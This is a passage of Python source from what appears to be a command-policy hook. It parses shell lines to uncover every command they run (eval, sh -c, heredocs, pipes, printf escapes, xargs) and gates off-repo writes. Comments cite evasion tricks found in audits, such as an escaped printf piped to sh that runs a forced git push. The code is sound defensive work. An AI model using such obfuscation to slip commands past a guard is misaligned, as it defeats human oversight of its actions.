    head = ws[0].rsplit("/", 1)[-1]
    bodies = []
    if head == "eval":
        rest = ws[2:] if ws[1:2] == ["--"] else ws[1:]
        bodies.append(" ".join(rest))
    elif head in _SHELLS:
        has_c, i = False, 1
        while i < len(ws):
            word = ws[i]
            if word == "--":
                i += 1
                break
            if word in ("-o", "+o", "-O", "+O"):
                i += 2
            elif re.fullmatch(r"[-+][A-Za-z]+", word):
                has_c = has_c or (word[0] == "-" and "c" in word)
                i += 1
            elif word.startswith("--"):
                i += 1
            else:
                break
        if has_c and i < len(ws):
            bodies.append(ws[i])
    elif head == "trap":
        rest = ws[2:] if ws[1:2] == ["--"] else ws[1:]
        if rest and rest[0] not in ("-", "-l", "-p", "-P"):
            bodies.append(rest[0])   # the action runs when the condition fires
    elif head == "alias":
        bodies += [w.split("=", 1)[1] for w in ws[1:] if "=" in w and not w.startswith("-")]
    elif head in _BODY_LAUNCHERS:
        bodies += _launcher_bodies(head, ws[1:])
    elif head == "gh":
        alias = _gh_alias(ws)
        if alias and alias[0] == "set" and alias[3]:
            bodies.append(alias[2])
    elif head == "git":
        bodies += _git_bodies(ws[1:])   # bisect run, rebase -x, submodule foreach (F3)
    elif head in ("sqlite3", "sed") or _peel_busybox(head, ws[1:])[0] == "sed":
        bodies += _shell_launcher_lines(*_peel_busybox(head, ws[1:]))
    else:
        _awk = _is_awk(_peel_busybox(head, ws[1:])[0])
        for code in _inline_code(head, ws[1:]):
            bodies += _code_commands(code)
            if _awk:
                bodies += _awk_pipe_cmds(code)   # print | "cmd", "cmd" | getline, |& (g1 #1)
    bodies += _head_bodies(ws)
    if not bodies:
        return None
    return chr(10).join(b.replace(_QNL, chr(10)) for b in bodies)


def _stdin_kind(ws):
    """"shell" or "interp" when ws runs the program it reads on standard input, else None."""
    if not ws:
        return None
    ws = _peel_shell(ws)   # busybox sh <<EOF reads its program on stdin (2026-10-29 audit, F2)
    head = ws[0].rsplit("/", 1)[-1]
    if head in _SHELLS:
        i, from_stdin = 1, False
        while i < len(ws):
            word = ws[i]
            if word in ("--", "-"):
                from_stdin = from_stdin or word == "-"
                i += 1
                break
            if word in ("-o", "+o", "-O", "+O"):
                i += 2
            elif re.fullmatch(r"[-+][A-Za-z]+", word):
                if word[0] == "-" and "c" in word:
                    return None
                from_stdin = from_stdin or (word[0] == "-" and "s" in word)
                i += 1
            elif word.startswith("--"):
                i += 1
            else:
                break
        return "shell" if from_stdin or i >= len(ws) else None
    key = _canon_interp(head)   # python3.12, lua5.4, perl5.36 read stdin too (g1 #1 sweep)
    if key in _INLINE_FLAGS and not _inline_code(head, ws[1:]):
        ops = [w for w in ws[1:] if not w.startswith("-") or w == "-"]
        flags = [w for w in ws[1:] if w.startswith("-") and w != "-"]
        if not ops or ops[0] == "-":
            return None if (key == "python" and "-m" in flags) else "interp"
    return None


def _script_operand(ws):
    """The script file ws runs: sh FILE, source FILE, . FILE, or ./FILE itself."""
    if not ws:
        return None
    ws = _peel_shell(ws)   # busybox sh FILE (2026-10-29 audit, F2)
    head = ws[0].rsplit("/", 1)[-1]
    if head in ("source", ".") and len(ws) > 1:
        return ws[1]
    if head in _SHELLS and _stdin_kind(ws) is None and _inner_body(ws) is None:
        ops = [w for w in ws[1:] if not w.startswith(("-", "+"))]
        return ops[0] if ops else None
    return ws[0] if "/" in ws[0] else None


_ECHO_ESCAPES = {"a": chr(7), "b": chr(8), "e": chr(27), "E": chr(27), "f": chr(12),
                 "n": chr(10), "r": chr(13), "t": chr(9), "v": chr(11), "\\": "\\", DQ: DQ,
                 SQ: SQ, "?": "?"}


def _decode_escapes(text, percent_b=False):
    # The backslash escapes printf decodes in its FORMAT, in a %b argument and in echo -e (and
    # in every echo under zsh, dash and POSIX sh): \n \t \\ ..., \NNN and \0NNN octal, \xHH.
    # printf "\x67it push --force origin main" | sh runs that push; the escapes were read as
    # text and it was allowed (PR #648 review). \u/\U are NOT decoded: no shell printf or echo
    # builtin decodes them. A %b \c ends the output.
    out, i, n = [], 0, len(text)
    while i < n:
        ch = text[i]
        if ch != "\\" or i + 1 >= n:
            out.append(ch)
            i += 1
            continue
        nxt = text[i + 1]
        m = None
        if nxt in _ECHO_ESCAPES:
            out.append(_ECHO_ESCAPES[nxt])
            i += 2
        elif nxt in "01234567":
            m = re.match(r"0[0-7]{0,3}" if (percent_b and nxt == "0") else r"[0-7]{1,3}", text[i + 1:])
            digits = m[0][1:] if (percent_b and nxt == "0") else m[0]
            out.append(chr(int(digits or "0", 8) & 255))
            i += 1 + len(m[0])
        elif nxt == "x":
            m = re.match(r"[0-9A-Fa-f]{1,2}", text[i + 2:])
            if m:
                out.append(chr(int(m[0], 16)))
                i += 2 + len(m[0])
            else:
                out.append(ch + nxt)
                i += 2
        elif nxt == "c" and percent_b:
            break
        else:
            out.append(ch + nxt)
            i += 2
    return "".join(out)


def _printf_text(fmt, args):
    # What printf FORMAT ARGS writes, conversions filled in order and the format reused while
    # arguments remain: printf "%s%s" gh " issue close 34" prints one command (#598 corpus).
    # The format escapes are decoded, and so is a %b argument (PR #648 review).
    # Each conversion is modelled as bash and dash print it (#654): %c is one character, .N cuts
    # a string, * takes the width or precision from the next argument. When the reader cannot be
    # sure what a conversion prints (a * argument it cannot read, a conversion it does not
    # model), the format is rendered twice and BOTH renderings are offered, one per line: once
    # with the argument whole and once with an unresolved mark in its place, each keeping the
    # text around it. A width only pads, so one that cannot be read is no padding (PR #655).
    whole = _printf_render(fmt, args, False)
    if not whole[1]:
        return whole[0]
    return whole[0] + chr(10) + _printf_render(fmt, args, True)[0]


def _printf_render(fmt, args, mark):
    """(text, unsure): one rendering of printf FORMAT ARGS. unsure says some conversion could not
    be read for certain; mark puts an unresolved mark in its place, else its argument whole."""
    out, state = [], {"next": 0, "used": 0, "unsure": False}

    def take():
        state["used"] += 1
        state["next"] += 1
        return args[state["next"] - 1] if state["next"] <= len(args) else ""

    def number(text):
        text = text.strip()
        if text[:1] in (SQ, DQ) and len(text) > 1:
            return ord(text[1])   # a leading quote: printf %d prints the code of the next char
        try:
            return int(text, 0)
        except ValueError:
            return 0

    def decimal(text):
        # A width or precision is decimal: %.03s cuts at 3, not at an octal reading of 03.
        text = text.strip()
        return int(text) if re.fullmatch(r"-?[0-9]+", text) else 0

    def star(text):
        # A * width or precision comes from an argument, which printf reads as a signed integer:
        # +3 and -3 are plain. One the reader cannot read for certain (a leading zero, hex,
        # junk) is None, never guessed (PR #655 review).
        text = text.strip()
        return int(text) if re.fullmatch(r"[+-]?(?:[1-9][0-9]*|0)", text) else None

    def unsure(arg):
        state["unsure"] = True
        return _UNRESOLVED if mark else arg

    def fill(m):
        if m[1]:
            return "%"
        flags, width, prec, conv = m[2] or "", m[3] or "", m[4] or "", m[5]
        if width == "*":
            width = str(star(take()) or 0)   # a width only pads: unread, it pads nothing
        cut = None
        if prec == ".*":
            cut = star(take())
            unread = cut is None
        else:
            unread = False
            cut = decimal(prec[1:] or "0") if prec else None
        arg = take()
        if conv in "sbcq":
            text = _decode_escapes(arg, percent_b=True) if conv == "b" else arg
            if unread:
                return unsure(text)
            if conv == "c":
                text = text[:1]
            elif cut is not None and cut >= 0:
                text = text[:cut]
        elif conv in "diu":
            text = str(number(arg))
        elif conv in "xXo" and number(arg) >= 0:
            text = format(number(arg), {"x": "x", "X": "X", "o": "o"}[conv])
        else:
            return unsure(arg)
        pad = min(abs(decimal(width)) if width else 0, 4096)
        return text.ljust(pad) if "-" in flags or width.startswith("-") else text.rjust(pad)
    pattern = r"%(?:(%)|([-+ #0]*)(-?[0-9]+|\*)?(\.(?:[0-9]*|\*))?([A-Za-z]))"
    while True:
        state["used"] = 0
        out.append(re.sub(pattern, fill, _decode_escapes(fmt)))
        if not state["used"] or state["next"] >= len(args):
            return "".join(out), state["unsure"]


def _echo_data(ws):
    """The text echo or printf writes, or None for any other command. Echo text comes back as
    written and, when it holds escapes, decoded too: bash decodes them only under -e, but zsh,
    dash and POSIX sh decode them always, and the host shell is not known here."""
    head = ws[0].rsplit("/", 1)[-1] if ws else ""
    rest = ws[1:]
    if head == "echo":
        while rest and re.fullmatch(r"-[neE]+", rest[0]):
            rest = rest[1:]
        raw = " ".join(rest)
        decoded = _decode_escapes(raw)
        text = decoded if decoded == raw else decoded + chr(10) + raw
    elif head == "printf":
        rest = rest[1:] if rest[:1] == ["--"] else rest
        rest = rest[2:] if rest[:1] == ["-v"] else rest
        text = _printf_text(rest[0], rest[1:]) if rest else ""
    else:
        return None
    return text.replace(_QNL, chr(10))


def _printed(body):
    """What a substitution body prints, newlines read as spaces: echo/printf commands, or any
    body whose output the reader can follow (cat <<< CMD, cat <<EOF, a pipe; _flow_output),
    else None."""
    try:
        chunks = [_echo_data(_command_words(_tokenize(seg)[0])) for _j, seg in _split(body)]
    except ValueError:
        chunks = None
    if chunks and all(chunk is not None for chunk in chunks):
        return " ".join(chunks).replace(chr(10), " ").strip()
    out = _flow_output(body)
    return None if out is None else out.replace(chr(10), " ").strip()


# --- Who reads which body (PR #648 review PRRT_kwDOTWxN9c6vzGqz, PRRT_kwDOTWxN9c6vzGq3) -----
# A simple command is its words plus its redirections, wherever they sit among the words, and
# each pipeline stage is a command of its own, with its own redirections and its own standard
# input. A heredoc or here-string body is read by the command that owns its << or <<< on fd 0
# (or dup-ed onto it, 3<<B 0<&3), never by its place on the line, and an output redirection
# (> f, 2>&1, &>/dev/null) never stops a command reading its input. A piped stage reads what
# the stage before it writes, through | and |& alike, and cat, tee and the line filters pass
# what they read on. Sources are UNIONED, never last-wins: bash and dash read only the last
# stdin redirection, but zsh (MULTIOS, on by default) reads the pipe and every redirection in
# turn and writes to a file AND the pipe; the hook does not know which shell runs the line.
# A group, loop, exec or function call reading a body hands it to the commands inside it.
_PASS_THROUGH = ("cat", "tee", "head", "tail", "tac", "sort", "uniq")
_STDIN_FILES = ("/dev/stdin", "/dev/fd/0", "/proc/self/fd/0")
_GROUP_CLOSERS = ("}", "done", "fi", "esac")
_GROUP_OPENERS = ("{", "while", "until", "if", "for", "select", "case")
_GH_WORD = re.compile(r"(^|[^A-Za-z0-9_.-])gh([^A-Za-z0-9_.-]|$)")
_FLOW_OUT = {}


def _redirs(seg):
    """(words, [(fd, op, target)]) of ONE simple command: every redirection is an attribute of
    the command wherever it sits among the words. fd is the descriptor it opens: 3<<B opens 3,
    not standard input, and &> or &>> opens "&" (1 and 2)."""
    words, redirs, pending = [], [], None
    for kind, value, fd in shell_tokens(seg, with_fd=True):
        if kind == "redirect":
            pending = (fd, value)
        elif pending:
            redirs.append(pending + (value,))
            pending = None
        else:
            words.append(value)
    return words, redirs


_REPLACED = chr(0) + "replaced" + chr(0)   # marks a > overwrite between versions of a file


def _write_file(written, word, texts, append):
    """Record what a command writes to a file: >> (and tee -a) adds to what it holds, in order,
    so a file built across several writes is read whole; > (and tee) starts a new version but
    never drops the old one: whether the overwrite runs at all (false && ... > f, a branch) is not
    known here, so what the file held before stays a version too (#654)."""
    key = os.path.normpath(word)
    chunks = written.setdefault(key, [])
    if not append and chunks:
        chunks.append(_REPLACED)
    chunks.extend(texts)


def _file_texts(word, written):
    """[(text, armable)] a file operand holds when the line shows it: a process substitution
    <(...) holds what its body prints (read while it runs, like a pipe); a file this line wrote
    holds each version it may have when it is read: every run of writes joined in order, the
    latest first (a separate command, so a receipt never arms it). Each write is offered alone
    too, which only adds views."""
    m = re.fullmatch(_SUB_MARK + r"([0-9]+)_", word)
    if m:
        out = _flow_output(_SUB_TEXTS[int(m[1])]) if int(m[1]) < len(_SUB_TEXTS) else None
        return [(out, True)] if out else []
    versions, cur = [], []
    for chunk in written.get(os.path.normpath(word), []):
        if chunk == _REPLACED:
            versions.append("".join(cur))
            cur = []
        else:
            cur.append(chunk)
    versions.append("".join(cur))
    views = [v for v in reversed(versions) if v]
    for chunk in written.get(os.path.normpath(word), []):
        if chunk != _REPLACED and chunk and chunk not in views:
            views.append(chunk)
    return [(v, False) for v in dict.fromkeys(views)]


def _reader_kind(ws):
    """shell or interp when ws runs the program on its standard input: sh, bash -s, sh -,
    python3, or a script operand naming standard input (sh /dev/stdin, source /dev/fd/0)."""
    kind = _stdin_kind(ws)
    if kind or not ws:
        return kind
    ws = _peel_shell(ws)   # busybox sh /dev/stdin (2026-10-29 audit, F2)
    head = ws[0].rsplit("/", 1)[-1]
    ops = [w for w in ws[1:] if not w.startswith(("-", "+"))]
    if not ops or ops[0] not in _STDIN_FILES:
        return None
    if head in _SHELLS or head in ("source", "."):
        return "shell"
    return "interp" if _canon_interp(head) in _INLINE_FLAGS else None


def _xargs_lines(args, ws, stdin):
    """The command lines xargs builds from what it reads: its command with each input line in
    place of the -I/-J/-i string, else with the input words appended. xargs splits its input
    into ARGUMENTS (quotes honoured) and runs no shell, so a ; in the input is data."""
    pre = args[:len(args) - len(ws)]
    at = [i for i, w in enumerate(pre) if w.rsplit("/", 1)[-1] == "xargs"]
    if not at or not ws or not stdin or _echo_data(ws) is not None:
        return []   # xargs echo prints its input: data, as echo is
    opts, repl = pre[at[-1] + 1:], None
    for i, w in enumerate(opts):
        if w in ("-I", "-J") and i + 1 < len(opts):
            repl = opts[i + 1]
        elif w in ("-i", "--replace"):
            repl = "{}"
        elif w.startswith("--replace="):
            repl = w[len("--replace="):]
        elif re.fullmatch(r"-[IJi].+", w, re.DOTALL):
            repl = w[2:]
    out = []
    for text, _arm in stdin:
        if repl:
            out += [shlex.join([w.replace(repl, line) for w in ws])
                    for line in text.split(chr(10)) if line.strip()]
            continue
        try:
            words = shlex.split(text)
        except ValueError:
            words = text.split()
        out.append(shlex.join(ws + words))
    return out[:16]


def _note_read(ws, stdin):
    """read NAME... takes its value from standard input: each line it may read becomes a value
    of NAME, so $NAME used as a command is judged as that line, as NAME=value is (#598)."""
    names, i = [], 1
    while i < len(ws):
        w = ws[i]
        if w == "--":
            names += ws[i + 1:]
            break
        if w.startswith("-") and len(w) > 1:
            i += 2 if w[-1] in "adinNptu" else 1
            continue
        names.append(w)
        i += 1
    for text, _arm in stdin:
        values = {text.split(chr(10))[0], text.replace(chr(10), " ").strip()}
        for name in names or ["REPLY"]:
            for value in values:
                if re.fullmatch(r"[A-Za-z_][A-Za-z0-9_]*", name):
                    _assign(name, value)


def _flow(surface, docs, inherit=(), written=None):
    """The pipelines of one surface, [(join, [stage])]; docs are its own heredocs in the order
    their << appear. A stage is a dict: seg, args (words as typed), ws (peeled), stdin (every
    (text, armable) that may reach its fd 0), out (what it writes to stdout, when readable),
    reads (it runs the program on its stdin), feeds ((kind, program, armable) it runs from
    what it reads) and prev (the stage piped into it). armable: the text reaches the reader
    inside the same pipeline, so a receipt &&-before that pipeline may arm what it runs."""
    written = {} if written is None else written
    parsed = []
    for join, seg in _split(surface):
        words, redirs = _redirs(seg)
        parsed.append((join, seg, words, redirs))
    opened = sum(op in ("<<", "<<-") for p in parsed for _fd, op, _t in p[3])
    # A count that disagrees with the heredocs the scanner found would misplace bodies: each is
    # then given to every command on the line instead, never dropped.
    stray = [] if opened == len(docs) else [(body, False) for _b, _a, body in docs]
    funcs = set()
    for _j, _s, words, _r in parsed:
        named = re.match(r"([A-Za-z_][A-Za-z0-9_.:-]*)(\(\))?\{?$", words[1] if words[:1] == ["function"]
                         and len(words) > 1 else (words[0] if words else ""))
        if named and (words[:1] == ["function"] or named[2] or words[1:2] == ["()"]):
            funcs.add(named[1])
    extra, pipes, local = {}, [], dict(written)
    for _round in range(4):
        pipes, k_doc, later, given = [], 0, list(stray), {}
        local = {key: list(v) for key, v in written.items()}
        for idx, (join, seg, args, redirs) in enumerate(parsed):
            ws = _command_words(args)
            prev = pipes[-1][1][-1] if join == "|" and pipes else None
            if prev is None:
                pipes.append((join, []))
            fds, writes, unread = {}, [], False
            for fd, op, target in redirs:
                if op in ("<<", "<<-"):
                    src = [(docs[k_doc][2], True)] if not stray and k_doc < len(docs) else []
                    k_doc += 1
                elif op == "<<<":
                    src = [(target.replace(_QNL, chr(10)) + chr(10), True)]
                elif op in ("<", "<>"):
                    src = _file_texts(target, local)
                elif op in ("<&", ">&") and target.isdigit():
                    src = list(fds.get(int(target), []))
                else:
                    if fd in (1, "&") and target != "-" and not target.isdigit():
                        writes.append((target, op))
                    continue
                unread = unread or (fd == 0 and not src)   # < FILE this line never wrote
                fds.setdefault(fd, []).extend(src)
            own = (prev["out"] if prev else []) + fds.get(0, [])   # zsh order: the pipe first
            stdin = own + list(inherit) + later + extra.get(idx, [])
            # blind: some of what reaches fd 0 cannot be read here -- a pipe from a stage whose
            # output is unknown, or a < file the line never wrote (W4-05, ro floor only).
            blind = unread or (prev is not None and prev["blind"])
            head = ws[0].rsplit("/", 1)[-1] if ws else ""
            data = _echo_data(ws)
            if data is not None:
                flags = []
                for a in ws[1:]:
                    if not re.fullmatch(r"-[neE]+", a):
                        break
                    flags.append(a)
                newline = head == "echo" and not any("n" in f for f in flags)
                out = [(data + (chr(10) if newline else ""), True)]
                out_blind = False
            elif head in _PASS_THROUGH:
                ops = [a for a in ws[1:] if not a.startswith("-")]
                out = list(stdin)
                out_blind = blind or not stdin
                if head != "tee" and ops:   # cat FILE reads the file, not its stdin
                    out_blind = any(not _file_texts(f, local) for f in ops)
                # tee -a, and any short cluster holding a (-ai, -ia), appends (#654).
                append = any(a == "--append" or re.fullmatch(r"-[A-Za-z]*a[A-Za-z]*", a)
                             for a in ws[1:])
                for f in ops:
                    if head == "tee":
                        _write_file(local, f, [t for t, _a in stdin], append)
                    else:
                        out += _file_texts(f, local)
            else:
                out, out_blind = [], True
            for f, op in writes:
                _write_file(local, f, [t for t, _a in out], op in (">>", "&>>"))
            kind, feeds = _reader_kind(ws), []
            if kind:
                feeds += [(kind, t, a) for t, a in stdin]
                if len(stdin) > 1:   # zsh reads them all, as one program, in this order
                    feeds.append((kind, "".join(t for t, _a in stdin), all(a for _t, a in stdin)))
            script = _script_operand(ws)
            if script and script not in _STDIN_FILES:
                feeds += [("shell", t, a) for t, a in _file_texts(script, local)]
            feeds += [("shell", line, False) for line in _xargs_lines(args, ws, stdin)]
            if head == "read":
                _note_read(ws, stdin)
            if stdin and _SUB_MARK in seg:
                # $(cat) reads the standard input of the command it sits in: echo CMD | eval
                # "$(cat)" runs CMD. The output is one word where it stands (an argument stays
                # data); as the head it is split into the command it names.
                for i, word in enumerate(ws):
                    for m in re.finditer(_SUB_MARK + r"([0-9]+)_", word):
                        k = int(m[1])
                        fed = _flow_output(_SUB_TEXTS[k], stdin) if k < len(_SUB_TEXTS) else None
                        if not fed or fed == _flow_output(_SUB_TEXTS[k]):
                            continue
                        new = word.replace(m[0], fed.strip(chr(10)))
                        line = (new + " " + shlex.join(ws[1:])) if i == 0 \
                            else shlex.join(ws[:i] + [new] + ws[i + 1:])
                        feeds.append(("shell", line.strip(), all(a for _t, a in stdin)))
            st = {"seg": seg, "args": args, "ws": ws, "stdin": stdin, "out": out,
                  "reads": bool(kind), "feeds": feeds, "prev": prev, "blind": out_blind,
                  "fed_blind": kind == "shell" and (blind or not stdin
                                                    or any(_unread_heads(t) for t, _a in stdin))}
            pipes[-1][1].append(st)
            quiet = [(t, False) for t, _a in own]
            first = args[0] if args else ""
            if quiet and first == "exec" and not ws:   # exec <<EOF: every later command reads it
                later += quiet
            if prev is not None and (first in _GROUP_OPENERS or first.startswith("(")):
                later += quiet   # echo CMD | { ...; sh; }: the whole group reads the pipe
            closer = first in _GROUP_CLOSERS or (bool(args) and args[-1].endswith(")")
                                                 and not first.startswith("("))
            if quiet and (closer or head in funcs):
                for j in range(len(parsed)):   # { ...; sh; } <<EOF, f <<EOF: the body is read inside
                    if j != idx:
                        given.setdefault(j, [])
                        given[j] += [q for q in quiet if q not in given[j]]
        if given == extra:
            break
        extra = given
    written.update(local)
    _FED_BLIND.extend(st["seg"] for _j, stages in pipes for st in stages if st["fed_blind"])
    return pipes


def _unread_heads(text):
    """True when a program fed to a shell names a command the hook cannot read: a head built
    from a variable or a substitution ($X, $(cat f), `...`), or text this reader cannot split.
    Feeds the ro floor only (W4-05): the write such a program makes is invisible here."""
    try:
        for _j, seg in _split(text.replace(_QNL, chr(10))):
            ws = _command_words(_tokenize(seg)[0])
            if ws and ("$" in ws[0] or chr(96) in ws[0] or _SUB_MARK in ws[0]):
                return True
    except ValueError:
        return True
    return False


def _flow_output(body, inherit=()):
    """What a substitution body writes to standard output when every pipeline in it ends in a
    command whose output is readable (echo, printf, cat or tee of a heredoc, here-string, pipe
    or of what the body inherits on standard input), else None."""
    key = (body, tuple(inherit))
    if key not in _FLOW_OUT:
        _FLOW_OUT[key] = None   # a body met again while it is read reads as unknown
        try:
            _raws, surface, _p, docs = substitution_bodies(body, 1, flat=False)
            outs = [stages[-1]["out"] for _j, stages in _flow(surface, docs, inherit)]
        except ValueError:
            outs = []
        if outs and all(outs):
            _FLOW_OUT[key] = "".join(t for o in outs for t, _a in o)
    return _FLOW_OUT[key]


def _fed_code(surface, docs, written=None):
    """[(kind, program)] the commands of ONE surface run from what they read (#598, PR #648
    review): a shell or interpreter reading a heredoc, here-string, pipe, process substitution
    or a file this line wrote, a command line xargs builds, a $(cat) reading the pipe (_flow).
    A command the program could come from but whose text this hook cannot see (a download, a
    file already on disk) stays beyond it."""
    out = []
    for _join, stages in _flow(surface, docs, written=written):
        for st in stages:
            out += [("interp" if kind == "interp" else "shell", prog) for kind, prog, _a in st["feeds"]]
            if st["reads"] and st["prev"] is not None and _SUB_MARK in st["prev"]["seg"]:
                _FED_SUB.append(st["prev"]["seg"])
    out = list(dict.fromkeys(out))
    _FED_INTERP.extend(prog for kind, prog in out if kind == "interp")
    return out


def _expand(text, depth=0, nest=0, written=None):
    """(command texts this line runs, patch bodies): the surface, every substitution body (each
    read with its own heredocs), and every program a command reads (_fed_code) -- each judged
    as command lines of their own."""
    written = {} if written is None else written
    raws, surface, patches, docs = substitution_bodies(text, 1 if nest else 0, flat=False)
    parts = [surface]
    for raw in raws:
        if nest < 4:
            more, more_patches = _expand(raw, depth, nest + 1, written)
            parts += more
            patches = patches + more_patches
        else:
            parts.append(raw)
    if depth < 3:
        for kind, code in _fed_code(surface, docs, written):
            if kind == "shell":
                more, more_patches = _expand(code, depth + 1, 0, written)
                parts += more
                patches = patches + more_patches
            else:
                parts += _code_commands(code)
    return parts, patches


def _body_pairs(body, texts=None):
    """(join, args) per segment of a shell body: its substitutions and the programs it feeds a
    shell are judged as commands too. texts, when given, collects each segment text so its
    redirects and tee operands reach the write boundary (2026-10-29 audit, F1)."""
    parts, _patches = _expand(body)
    pairs = _split(chr(10).join(parts))
    if texts is not None:
        texts += [seg for _join, seg in pairs]
    return [(join, _tokenize(seg)[0]) for join, seg in pairs]


def _views(args, depth=0, texts=None):
    """[(assignments, words)]: the command a segment runs, then each command its body runs.
    texts, when given, collects the text of every body segment, at every depth, for the write
    boundary: a redirect inside sh -c, find -exec sh -c, sed e or awk system() is a write the
    shell makes as surely as one on the line itself (2026-10-29 audit, F1)."""
    assigns = []
    ws = _command_words(args, assigns)
    _note_assigns(assigns, ws)
    out = [(assigns, ws)]
    body = _inner_body(ws) if depth < 3 else None
    if body is not None:
        try:
            pairs = _body_pairs(body, texts)
        except ValueError:
            # A body this reader cannot split is still judged by its words, never skipped.
            pairs = [("start", body.split())]
            if texts is not None:
                texts.append(_UNSPLIT + body)   # F1: its redirects are still read, coarsely
        for _j, inner in pairs:
            out += _views(inner, depth + 1, texts)
    return out


# Marks a body text the splitter could not read (F1): its write targets are taken coarsely.
_UNSPLIT = chr(0xE001)


def _coarse_writes(text):
    """[(target, raw)] every word after a write redirect in text this reader cannot split, so
    a body it fails to parse still has its writes judged, never dropped (2026-10-29 audit, F1)."""
    found = re.findall(r"(?:&>>?|>>|>\||>&|<>|>)[ \t]*([^ \t\n;&|<>()]+)", text)
    out = []
    for word in found:
        if not re.fullmatch(r"[0-9]+|-", word):
            unq = word.strip(SQ + DQ)
            out.append((unq, word))
    return out


def _home_path(p):
    """p with a leading ~, ~user, $HOME or ${HOME} expanded the way the shell expands it (W1-01,
    2026-10-27 audit). The boundary held two meanings of ~: the self-guard expanded it, the
    write boundary read it as a directory named ~ under the cwd, so `> ~/.bashrc` was never
    judged and the `~/.bashrc` of a file tool resolved inside the worktree. A ~name no account
    owns stays literal, as it does in the shell. A file-tool path carries no shell quoting, so
    this expands unconditionally; a shell word is expanded QUOTE-AWARE through _sh_home_path."""
    if p.startswith("~"):
        return os.path.expanduser(p)
    m = re.match(r"[$](?:HOME|[{]HOME[}])(?=/|$)", p)
    if m:
        return (os.environ.get("HOME") or os.path.expanduser("~")) + p[m.end():]
    return p


def _sh_home_path(unq, raw):
    """A shell word home expansion, quote-aware (Codex g1 P2): bash expands a leading tilde only
    when it is UNQUOTED, and a leading $HOME/${HOME} only when it is not single-quoted. So a
    quoted tilde path stays the literal relative path the shell writes, not an over-denied home
    path. raw is the pre-unquote slice."""
    if unq.startswith("~"):
        return _home_path(unq) if raw.startswith("~") else unq
    if re.match(r"[$](?:HOME|[{]HOME[}])(?=/|$)", unq):
        inner = raw[1:] if raw[:1] == DQ else raw     # a leading " still allows $HOME to expand
        return _home_path(unq) if inner[:1] == "$" else unq
    return unq


def _write_targets(seg):
    """[(unquoted, raw)] for file-write redirect targets and tee operands in one segment, the raw
    slice kept so home expansion can be quote-aware (Codex g1 P2)."""
    toks, redirs, pending = [], [], None
    for kind, val, rawslice in shell_tokens(seg, raw=True):
        if kind == "redirect":
            pending = val
        elif pending is not None:
            if pending in (">", ">>", ">|", ">&", "&>", "&>>", "<>"):
                redirs.append((val, rawslice))
            pending = None
        else:
            toks.append((val, rawslice))
    out = list(redirs)
    ws = _command_words([v for v, _r in toks])
    if ws and ws[0].rsplit("/", 1)[-1] == "tee":
        seen = False
        for v, rawslice in toks:
            if not seen:
                seen = v.rsplit("/", 1)[-1] == "tee"
                continue
            if v in ("-", "--") or not (v.startswith("-") and len(v) > 1):
                out.append((v, rawslice))
    return out


_parts, heredoc_patches = _expand(raw_command)
_judged, _subs = chr(10).join(_parts), _parts[1:]
heredoc_targets = [p for _hb in heredoc_patches for p in patch_targets(_hb)]
print(s(norm_tool))
print(c(_judged))
print(s(_home_path(target_paths[0]) if target_paths else ""))
for _extra_p in target_paths[1:]:
    record("F", s(_home_path(_extra_p)))
# Pass 1 learns every literal NAME=value on the line before any head is resolved (#598): an
# assignment in a later segment, or inside a body, still names what `$c` may run.
for _join, seg in _split(_judged):
    _views(_tokenize(seg)[0])
_guard_segs = []
_all_views = []   # (words, writes, segment text) of every command in order, bodies included
_all_assigns = []   # the NAME=value words in front of each of those commands, in the same order
_body_texts = []   # the text of every body segment the line runs, for the write boundary (F1)
for _join, seg in _split(_judged):
    args, writes = _tokenize(seg)
    _guard_segs.append((args, writes))
    # C carries the peeled command, not the words as typed: the HIGH tier and the never list
    # anchor at its head (2026-10-23 review, P1-3). Assignments ride in front for git_redirected.
    _seg_views = _views(args, texts=_body_texts)
    record("C", " ".join(policy_word(word) for word in _seg_views[0][0] + _seg_views[0][1]))
    for word in args:
        record("A", word)
    for _va, _vw in _seg_views[1:]:
        record("C", " ".join(policy_word(word) for word in _va + _vw))
    _all_views += [(_vw, writes, seg) if _k == 0 else (_vw, [], "")
                   for _k, (_va, _vw) in enumerate(_seg_views)]
    _all_assigns += [_va for _va, _vw in _seg_views]


def _is_deferred_def(ws):
    # A command that DEFINES an action to run later (maybe many times), not one that runs it
    # now: a trap, an alias, a gh alias set. A receipt on the defining line is consumed now and
    # cannot cover a send that fires later, so a send inside one of these needs a receipt INSIDE
    # it (PR #648 review PRRT_kwDOTWxN9c6vu_Ri).
    if not ws:
        return False
    head = ws[0].rsplit("/", 1)[-1]
    if head in ("trap", "alias"):
        return True
    if head == "gh":
        alias = _gh_alias(ws)
        return bool(alias and alias[0] == "set")
    return False


def _repeats(args, ws):
    # A launcher that can run its command MORE THAN ONCE: watch, find -exec/-execdir/-ok/-okdir
    # (per match, or per batch with +), fd -x/-X, entr (per change), zsh repeat, parallel (per
    # argument), xargs (per input batch), and a while/until condition (per iteration). One
    # receipt covers exactly one send, so an outer receipt cannot arm what such a launcher runs;
    # the receipt must sit inside it (PR #648 review PRRT_kwDOTWxN9c6vxmAh). A for/select or
    # while body is already its own unarmed segment; xargs and the loop keywords are peeled off
    # ws, so they are read from args.
    head = ws[0].rsplit("/", 1)[-1] if ws else ""
    if head in ("watch", "parallel", "entr", "repeat"):
        return True
    if head == "git" and _git_bodies(ws[1:]):
        return True   # rebase -x per commit, bisect run per step, foreach per submodule (F3)
    if head == "find" and any(w in ("-exec", "-execdir", "-ok", "-okdir") for w in ws[1:]):
        return True
    if head in ("fd", "fdfind") and any(_fd_exec(w) or w.startswith(("--exec=", "--exec-batch="))
                                        for w in ws[1:]):
        return True
    return any(w.rsplit("/", 1)[-1] in ("xargs", "while", "until")
               for w in args[:max(0, len(args) - len(ws))])


def _unreceipted_flow(pipes, armed=False, depth=0):
    """True when an off-repo write in these pipelines (_flow) has no receipt immediately
    &&-before it. A receipt arms the ONE pipeline &&-joined after it (or the first pipeline of a
    scope entered armed): its first stage (a send, sh -c SEND, a launcher), and a program any of
    its stages reads from a heredoc, here-string, pipe or process substitution. One receipt
    covers exactly one send, so the first stage or program that runs one takes it. A stage
    after a pipe is not itself &&-joined, so its own send or -c body is never armed; a DEFERRED
    or REPEATED body never is either (PR #648 review)."""
    for n, (join, stages) in enumerate(pipes):
        token = armed and (join == "&&" or n == 0)
        if len(stages) == 1 and _is_receipt(stages[0]["args"]):
            armed = True
            continue
        if armed and join in (";", "start") and len(stages) == 1 \
                and stages[0]["args"] in (["}"], [")"]):
            # 2026-10-29 audit, F8: `{ receipt; }` and `( receipt; )` end on the receipt, so the
